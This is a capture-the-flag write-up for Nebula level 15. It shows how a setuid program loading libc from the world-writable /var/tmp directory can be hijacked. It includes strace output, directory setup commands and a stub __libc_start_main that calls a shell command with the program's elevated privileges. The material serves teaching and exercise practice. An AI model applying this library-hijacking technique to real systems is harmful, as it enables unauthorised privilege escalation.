##Description:


[Problem source](https://exploit-exercises.com/nebula/level15/)


We are given an executable with suid bit set. As indicated by the problem
description, the program is most likely trying to load a shared library during
the runtime from an unsecured location.

##Solution


Stracing the executable shows that the program is trying to load dynamic
libraries from publicly writable directories.

	stat64("/var/tmp/flag15/sse2/cmov", 0xbfc67064) = -1 ENOENT (No such file or directory) 
	open("/var/tmp/flag15/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory) 
	stat64("/var/tmp/flag15/sse2", 0xbfc67064) = -1 ENOENT (No such file or directory)
	open("/var/tmp/flag15/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory) 
	stat64("/var/tmp/flag15/cmov", 0xbfc67064) = -1 ENOENT (No such file or directory) 
	open("/var/tmp/flag15/libc.so.6", O_RDONLY) = 3

We can compile our own libc and the program will most likely load it, as
/var/tmp/ is publicly writable folder.

First lets create a dummy file in the location `/var/tmp/flag15/libc.so.6` and
see if the program will try to load it.

	mkdir /var/tmp/flag15/
	touch /var/tmp/flag15/libc.so.6

Runnign the program again

	./flag15: error while loading shared libraries:
	/var/tmp/flag15/libc.so.6: file too short	

Good. Now the only thing left for us is to compile our own libc library. `ld` is
calling to the __libc_start_main when it first gets loaded in the memory. So we
can only implement this function and it will be automatically called by the
dynanmic linker. 

	int __libc_start_main(){
		system("/bin/getflag");
	}

##Lessons learned


Compiling the shared library had some problems. Will investigate further after
my ELF Article


Article about `strace` -- Coming up

